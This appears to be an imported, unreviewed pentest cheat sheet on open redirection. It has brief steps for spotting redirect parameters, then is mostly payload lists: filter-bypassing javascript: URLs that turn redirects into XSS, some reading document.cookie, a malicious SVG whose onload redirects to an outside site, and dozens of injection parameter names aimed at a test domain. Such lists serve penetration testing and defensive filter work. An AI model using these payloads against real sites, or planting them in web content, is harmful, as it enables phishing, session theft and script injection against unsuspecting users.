---
technique: "Open Redirection"
family: "client-side"
severity_hint: "medium"
tags: ["XSS", "Deserialization", "Open Redirect", "JavaScript", "HTTP"]
source: "_raw/Web attacks/Web Attacks/Open Redirection.md"
source_sha256: "8634688fafd91a9db195fac32f5b0ae30dfe25d4869e2fa5705be5c7949b24d8"
curator_version: 2
review_status: imported-unreviewed
---

# Open Redirection

> Family: **client-side** · Severity hint: **medium** · Tags: XSS, Deserialization, Open Redirect, JavaScript, HTTP
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `haskell: # Basic payload, javascript code is executed after "javascript:"`
- `xml: <?xml version="1.0" encoding="UTF-8" standalone="yes"?>`
- `haskell: /{payload}`

## Playbook (operator notes)

# Open Redirection

https://github.com/r0075h3ll/Oralyzer

<aside>
⚠️

An open redirect paired with a arbitrary file upload can lead to PHP Phar deserilization attacks **Exploiting PHP Deserialization** 

</aside>

# Find open Redirects Trick

### Steps

1. If the Application has a user Sign-In/Sign-Up feature → register a user and log in
2. Go to your user profile page , for example : [samplesite.me/accounts/profile](http://samplesite.me/accounts/profile)
3. Copy the profile page's URL
4. Logout and Clear all the cookies and go to the homepage of the site
5. Paste the Copied Profile URL on the address bar
6. If the site prompts for a login → check the address bar, you may find the login page with a redirect parameter like the following
    1. [https://samplesite.me/login?next=accounts/profile](https://samplesite.me/login?next=accounts/profile)
    2. [https://samplesite.me/login?retUrl=accounts/profile](https://samplesite.me/login?retUrl=accounts/profile)

# Open Redirect to XSS

```haskell
# Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

# Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

# Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
# This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

# Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

# Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```

# Open Redirect uploading svg files

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg 
		onload="window.location='http://www.yekta-it.de'" 
		xmlns="http://www.w3.org/2000/svg"> 
</svg>
```

# Common injection parameters

```haskell
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://c1h2e1.github.io
data=https://c1h2e1.github.io
qurl=https://c1h2e1.github.io
login=https://c1h2e1.github.io
logout=https://c1h2e1.github.io
ext=https://c1h2e1.github.io
clickurl=https://c1h2e1.github.io
goto=https://c1h2e1.github.io
rit_url=https://c1h2e1.github.io
forward_url=https://c1h2e1.github.io
@https://c1h2e1.github.io
forward=https://c1h2e1.github.io
pic=https://c1h2e1.github.io
callback_url=https://c1h2e1.github.io
jump=https://c1h2e1.github.io
jump_url=https://c1h2e1.github.io
click?u=https://c1h2e1.github.io
originUrl=https://c1h2e1.github.io
origin=https://c1h2e1.github.io
Url=https://c1h2e1.github.io
desturl=https://c1h2e1.github.io
u=https://c1h2e1.github.io
page=https://c1h2e1.github.io
u1=https://c1h2e1.github.io
action=https://c1h2e1.github.io
action_url=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
sp_url=https://c1h2e1.github.io
service=https://c1h2e1.github.io
recurl=https://c1h2e1.github.io
j?url=https://c1h2e1.github.io
url=//https://c1h2e1.github.io
uri=https://c1h2e1.github.io
u=https://c1h2e1.github.io
allinurl:https://c1h2e1.github.io
q=https://c1h2e1.github.io
link=https://c1h2e1.github.io
src=https://c1h2e1.github.io
tc?src=https://c1h2e1.github.io
linkAddress=https://c1h2e1.github.io
location=https://c1h2e1.github.io
burl=https://c1h2e1.github.io
request=https://c1h2e1.github.io
backurl=https://c1h2e1.github.io
RedirectUrl=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
ReturnUrl=https://c1h2e1.github.io
```

---

[Open Redirect](https://book.hacktricks.xyz/pentesting-web/open-redirect)

[Find OpenRedirect Trick](https://kathan19.gitbook.io/howtohunt/open-redirection/find_openredirect_trick)

[Open Redirection Bypass](https://kathan19.gitbook.io/howtohunt/open-redirection/open_redirection_bypass)

## Source
Original note: `_raw/Web attacks/Web Attacks/Open Redirection.md`
